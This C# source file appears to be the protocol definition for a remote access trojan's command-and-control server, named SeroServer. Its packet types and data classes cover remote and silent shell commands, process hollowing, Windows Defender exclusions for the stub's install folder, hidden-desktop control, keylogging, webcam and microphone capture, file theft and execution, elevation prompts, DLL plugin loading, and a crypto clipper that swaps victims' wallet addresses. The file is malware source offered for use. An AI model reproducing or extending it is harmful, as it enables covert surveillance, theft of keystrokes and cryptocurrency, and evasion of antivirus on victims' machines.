using System.IO;
using Newtonsoft.Json;

namespace SeroServer.Protocol;

public enum PacketType
{
    // Client -> Server
    Heartbeat = 2,
    ClientInfo = 3,
    ShellOutput = 4,
    ElevationResult = 5,

    // Server -> Client
    HeartbeatAck = 11,
    Disconnect = 14,
    RemoteShell = 20,
    RemoteFileExec = 21,
    Uninstall = 22,
    HollowExec = 23,
    UpdateClient = 24,
    RequestElevation = 30,
    RequestElevationLoop = 31,
    Ping = 32,
    Pong = 33,
    ActiveWindow = 34,  // client→server: active foreground window title
    CameraStatus = 35,  // client→server: "Yes" / "No"

    // Remote Desktop
    RdpStart = 50,       // server→client: {Quality, Fps}
    RdpStop = 51,        // bidirectional
    RdpFrame = 52,       // client→server: {w, h, j}
    RdpInput = 53,       // server→client: {T, X, Y, Button, Down, WheelDelta, VK}
    RdpClipboard = 54,   // bidirectional: {Text}
    RdpFrameAck = 55,    // server→client: server rendered frame, ready for next
    RdpGetMonitors = 56, // server→client: request monitor list without starting stream

    // Webcam
    WcamStart = 60,      // server→client: {DeviceIndex, Quality, Fps}
    WcamStop = 61,       // bidirectional
    WcamFrame = 62,      // client→server: {Fn, W, H, J}
    WcamDevices = 63,    // client→server: {Devices:[...]}

    DefenderExclude = 70, // server→client: add WMI exclusion for stub install dir (no payload)
    PluginExec = 71,      // server→client: load + run a native DLL plugin in-process

    AutoTaskShell = 80,       // server→client: silent shell command (autotask, no shell window)
    AutoTaskShellOutput = 81, // client→server: result of AutoTaskShell (not routed to shell window)

    // HVNC — Hidden Virtual Desktop
    HvncStart     = 100,  // server→client: {Quality, Fps, Width, Height}
    HvncStop      = 101,  // bidirectional
    HvncFrame     = 102,  // client→server: {W, H, J}
    HvncFrameAck  = 103,  // server→client: ready for next frame
    HvncInput     = 104,  // server→client: {T, X, Y, Button, Down, WheelDelta, VK}
    HvncExec      = 105,  // server→client: {Path} — launch process on hidden desktop
    HvncClipboard = 106,  // server→client: {Text} — push text to hidden desktop clipboard

    // TCP Manager
    TcpGetList    = 110,  // server→client: request TCP connection list
    TcpListResult = 111,  // client→server: list of TCP connections
    TcpClose      = 112,  // server→client: close a connection by local+remote addr

    // Startup Manager
    StartupGetList    = 120,  // server→client: request startup entries
    StartupListResult = 121,  // client→server: list of startup entries
    StartupDelete     = 122,  // server→client: delete a startup entry

    // File Manager
    FmList       = 130,  // server→client: list directory {Path}
    FmListResult = 131,  // client→server: directory listing
    FmDownload   = 132,  // server→client: download file {Path}
    FmFileData   = 133,  // client→server: file data {Path, Data, Error}
    FmUpload     = 134,  // server→client: upload file {Path, Data}
    FmDelete     = 135,  // server→client: delete {Path}
    FmRename     = 136,  // server→client: rename {OldPath, NewPath}
    FmMkDir      = 137,  // server→client: create folder {Path}
    FmExec       = 138,  // server→client: execute file {Path, Mode}
    FmHash       = 139,  // server→client: hash file {Path}
    FmHashResult = 140,  // client→server: {Path, Hash, Error}
    FmAck        = 141,  // client→server: {Path, Success, Error}
    FmShowHide   = 142,  // server→client: toggle hidden attr {Path, Hide}

    // Microphone
    MicGetDevices    = 150,  // server→client: request device list
    MicDevicesResult = 151,  // client→server: {Devices:[{Index, Name}]}
    MicStart         = 152,  // server→client: {DeviceIndex, SampleRate}
    MicStop          = 153,  // bidirectional
    MicData          = 154,  // client→server: {Data} base64 PCM chunk

    // Fun
    FunCmd    = 160,  // server→client: {Action, Param}
    FunResult = 161,  // client→server: {Action, Result}

    // Keylogger
    KeyloggerStart       = 170,  // server→client: start capturing keys
    KeyloggerStop        = 171,  // server→client: stop capturing keys
    KeyloggerGetLogs     = 172,  // server→client: request in-memory buffer
    KeyloggerLogsResult  = 173,  // client→server: {Logs, IsRunning}
    KeyloggerClear       = 174,  // server→client: clear log buffer
    KeyloggerListFiles   = 175,  // server→client: list log files on disk
    KeyloggerFilesResult = 176,  // client→server: [{Filename, Size}]
    KeyloggerGetFile     = 177,  // server→client: {Filename}
    KeyloggerFileContent = 178,  // client→server: {Filename, Content}
    KeyloggerDeleteFile  = 179,  // server→client: {Filename}

    // Crypto Clipper
    ClipperSetConfig   = 180,  // server→client: {Enabled, Addresses:{BTC,ETH,...}}
    ClipperGetStats    = 181,  // server→client: request stats
    ClipperStatsResult = 182,  // client→server: {Enabled, Count, LastType, LastOrig, LastNew}
    ClipperDetected    = 183,  // client→server: notification {Type, Original, Replaced}
}

public class Packet
{
    public PacketType Type { get; set; }
    public string Data { get; set; } = string.Empty;
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeSeconds();

    public byte[] Serialize()
    {
        var json = JsonConvert.SerializeObject(this);
        var jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
        var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
        var buffer = new byte[4 + jsonBytes.Length];
        Buffer.BlockCopy(lengthBytes, 0, buffer, 0, 4);
        Buffer.BlockCopy(jsonBytes, 0, buffer, 4, jsonBytes.Length);
        return buffer;
    }

    public static async Task<Packet?> ReadFromStreamAsync(Stream stream, CancellationToken ct = default)
    {
        // 60s timeout per packet read (enough for large file transfers)
        using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        timeoutCts.CancelAfter(TimeSpan.FromSeconds(60));
        var token = timeoutCts.Token;

        var lengthBuf = new byte[4];
        int read = 0;
        while (read < 4)
        {
            int n = await stream.ReadAsync(lengthBuf.AsMemory(read, 4 - read), token);
            if (n == 0) return null;
            read += n;
        }

        int length = BitConverter.ToInt32(lengthBuf, 0);
        if (length <= 0 || length > 100 * 1024 * 1024) return null; // 100 MB max

        var dataBuf = new byte[length];
        read = 0;
        while (read < length)
        {
            int n = await stream.ReadAsync(dataBuf.AsMemory(read, length - read), token);
            if (n == 0) return null;
            read += n;
        }

        var json = System.Text.Encoding.UTF8.GetString(dataBuf);
        return JsonConvert.DeserializeObject<Packet>(json);
    }

    public static async Task WriteToStreamAsync(Stream stream, Packet packet, CancellationToken ct = default)
    {
        var data = packet.Serialize();
        await stream.WriteAsync(data, ct);
        await stream.FlushAsync(ct);
    }
}

// ── Data Classes ────────────────────────────────────

public class ClientInfoData
{
    public string OS { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Hwid { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string AuthKey { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Antivirus { get; set; } = string.Empty;
    public string IdPrefix { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
}

public class ShellOutputData
{
    public string Output { get; set; } = string.Empty;
    public int ExitCode { get; set; }
}

public class RemoteFileExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

public class UpdateClientData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

public class HollowExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string TargetProcess { get; set; } = string.Empty;
}

public class RdpStartData
{
    public int Quality { get; set; } = 50;
    public int Fps { get; set; } = 15;
}

public class RdpInputData
{
    public string T { get; set; } = string.Empty; // mm/mc/mw/kk
    public int X { get; set; }
    public int Y { get; set; }
    public int Button { get; set; }   // 0=left 1=right 2=middle
    public bool Down { get; set; }
    public int WheelDelta { get; set; }
    public int VK { get; set; }
    public bool Extended { get; set; }
}

public class RdpClipboardData { public string Text { get; set; } = string.Empty; }

public class WcamStartData
{
    public int DeviceIndex { get; set; }
    public int Quality { get; set; } = 50;
    public int Fps { get; set; } = 15;
}

public class ElevationResultData
{
    public bool Success { get; set; }
    public string Message { get; set; } = string.Empty;
}

public class PluginExecData
{
    public string DllBase64 { get; set; } = string.Empty;
    public string ExportName { get; set; } = "PluginMain";
}

public class HvncStartData
{
    public int Quality { get; set; } = 75;
    public int Fps     { get; set; } = 20;
    public int Width   { get; set; } = 1280;
    public int Height  { get; set; } = 720;
}

public class HvncFrameData
{
    public int    W { get; set; }
    public int    H { get; set; }
    public string J { get; set; } = string.Empty; // base64 JPEG
}

public class HvncInputData
{
    public string T { get; set; } = string.Empty; // mm/mc/mw/kk (same as RdpInputData)
    public int  X { get; set; }
    public int  Y { get; set; }
    public int  Button { get; set; }
    public bool Down { get; set; }
    public int  WheelDelta { get; set; }
    public int  VK { get; set; }
}

public class HvncExecData
{
    public string Path { get; set; } = string.Empty;
}

public class HvncClipboardData
{
    public string Text { get; set; } = string.Empty;
}

// ── TCP Manager ──────────────────────────────────────
public class TcpEntry
{
    public int    Pid         { get; set; }
    public string ProcessName { get; set; } = string.Empty;
    public string LocalAddr   { get; set; } = string.Empty;
    public string RemoteAddr  { get; set; } = string.Empty;
    public string State       { get; set; } = string.Empty;
}
public class TcpListResultData  { public List<TcpEntry> Entries { get; set; } = []; }
public class TcpCloseData       { public string LocalAddr { get; set; } = string.Empty; public string RemoteAddr { get; set; } = string.Empty; }

// ── Startup Manager ──────────────────────────────────
public class StartupEntry
{
    public string Name     { get; set; } = string.Empty;
    public string Path     { get; set; } = string.Empty;
    public string Type     { get; set; } = string.Empty;  // Reg / File / Task
    public string Location { get; set; } = string.Empty;
}
public class StartupListResultData { public List<StartupEntry> Entries { get; set; } = []; }
public class StartupDeleteData     { public string Name { get; set; } = string.Empty; public string Type { get; set; } = string.Empty; public string Location { get; set; } = string.Empty; }

// ── File Manager ─────────────────────────────────────
public class FmListData       { public string Path { get; set; } = string.Empty; }
public class FmEntry
{
    public string Name     { get; set; } = string.Empty;
    public bool   IsDir    { get; set; }
    public long   Size     { get; set; }
    public string Modified { get; set; } = string.Empty;
    public bool   IsHidden { get; set; }
}
public class FmListResultData { public string Path { get; set; } = string.Empty; public List<FmEntry> Entries { get; set; } = []; public string Error { get; set; } = string.Empty; }
public class FmDownloadData   { public string Path { get; set; } = string.Empty; }
public class FmFileDataResult { public string Path { get; set; } = string.Empty; public string Data { get; set; } = string.Empty; public string Error { get; set; } = string.Empty; }
public class FmUploadData     { public string Path { get; set; } = string.Empty; public string Data { get; set; } = string.Empty; }
public class FmDeleteData     { public string Path { get; set; } = string.Empty; }
public class FmRenameData     { public string OldPath { get; set; } = string.Empty; public string NewPath { get; set; } = string.Empty; }
public class FmMkDirData      { public string Path { get; set; } = string.Empty; }
public class FmExecData       { public string Path { get; set; } = string.Empty; public string Mode { get; set; } = "normal"; }
public class FmHashData       { public string Path { get; set; } = string.Empty; }
public class FmHashResultData { public string Path { get; set; } = string.Empty; public string Hash { get; set; } = string.Empty; public string Error { get; set; } = string.Empty; }
public class FmAckData        { public string Path { get; set; } = string.Empty; public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
public class FmShowHideData   { public string Path { get; set; } = string.Empty; public bool Hide { get; set; } }

// ── Microphone ────────────────────────────────────────
public class MicDevice           { public int Index { get; set; } public string Name { get; set; } = string.Empty; }
public class MicDevicesResultData { public List<MicDevice> Devices { get; set; } = []; }
public class MicStartData         { public int DeviceIndex { get; set; } public int SampleRate { get; set; } = 16000; }
public class MicDataPacket        { public string Data { get; set; } = string.Empty; }

// ── Fun ───────────────────────────────────────────────
public class FunCmdData    { public string Action { get; set; } = string.Empty; public string Param { get; set; } = string.Empty; }
public class FunResultData { public string Action { get; set; } = string.Empty; public string Result { get; set; } = string.Empty; }

// ── Keylogger ─────────────────────────────────────────
public class KeyloggerLogsResultData
{
    public string Logs      { get; set; } = string.Empty;
    public bool   IsRunning { get; set; }
}
public class KeyloggerFileEntry
{
    public string Filename { get; set; } = string.Empty;
    public long   Size     { get; set; }
}
public class KeyloggerFilesResultData
{
    public List<KeyloggerFileEntry> Files     { get; set; } = [];
    public bool                     IsRunning { get; set; }
}
public class KeyloggerGetFileData     { public string Filename { get; set; } = string.Empty; }
public class KeyloggerFileContentData { public string Filename { get; set; } = string.Empty; public string Content { get; set; } = string.Empty; }

// ── Crypto Clipper ────────────────────────────────────
public class ClipperAddresses
{
    public string BTC  { get; set; } = string.Empty;
    public string ETH  { get; set; } = string.Empty;
    public string LTC  { get; set; } = string.Empty;
    public string XMR  { get; set; } = string.Empty;
    public string SOL  { get; set; } = string.Empty;
    public string TRX  { get; set; } = string.Empty;
    public string XRP  { get; set; } = string.Empty;
    public string DASH { get; set; } = string.Empty;
    public string BCH  { get; set; } = string.Empty;
    public string BNB  { get; set; } = string.Empty;
}
public class ClipperSetConfigData
{
    public bool             Enabled   { get; set; }
    public ClipperAddresses Addresses { get; set; } = new();
}
public class ClipperStatsResultData
{
    public bool   Enabled   { get; set; }
    public int    Count     { get; set; }
    public string LastType  { get; set; } = string.Empty;
    public string LastOrig  { get; set; } = string.Empty;
    public string LastNew   { get; set; } = string.Empty;
}
public class ClipperDetectedData
{
    public string Type     { get; set; } = string.Empty;
    public string Original { get; set; } = string.Empty;
    public string Replaced { get; set; } = string.Empty;
}

